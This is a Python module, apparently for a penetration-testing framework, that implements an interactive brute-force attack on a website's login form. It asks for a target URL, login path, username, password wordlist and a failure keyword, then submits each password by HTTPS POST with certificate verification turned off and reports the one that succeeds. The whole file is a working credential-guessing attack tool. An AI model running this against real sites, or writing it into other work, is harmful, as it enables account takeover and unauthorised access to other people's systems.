import requests

class Exploit:
    name = "Interactive HTTPS Login Bruteforce"
    description = "Prompts for input, then bruteforces login credentials over HTTPS"
    options = {}

    def run(self):
        # Get user input
        rhost = input("[?] Enter full site URL (e.g., https://example.com): ").strip()
        login_url = input("[?] Enter login path (e.g., /login): ").strip()
        username = input("[?] Enter username to attack (e.g., admin): ").strip()
        wordlist_path = input("[?] Enter wordlist file name (e.g., wordlist.txt): ").strip()
        fail_keyword = input("[?] Enter keyword seen in a failed login response (e.g., Invalid): ").strip()

        full_url = rhost + login_url

        # Read wordlist
        try:
            with open(wordlist_path, "r") as f:
                passwords = [line.strip() for line in f.readlines()]
        except FileNotFoundError:
            print(f"[!] Wordlist file not found: {wordlist_path}")
            return

        print(f"[*] Starting bruteforce on {full_url} as {username}")

        for password in passwords:
            try:
                data = {"username": username, "password": password}
                response = requests.post(full_url, data=data, verify=False)

                if fail_keyword not in response.text:
                    print(f"[+] SUCCESS! Password found: {password}")
                    return
                else:
                    print(f"[-] Tried: {password} — Failed")
            except Exception as e:
                print(f"[!] Request failed: {e}")

        print("[!] Bruteforce completed — no valid password found.")
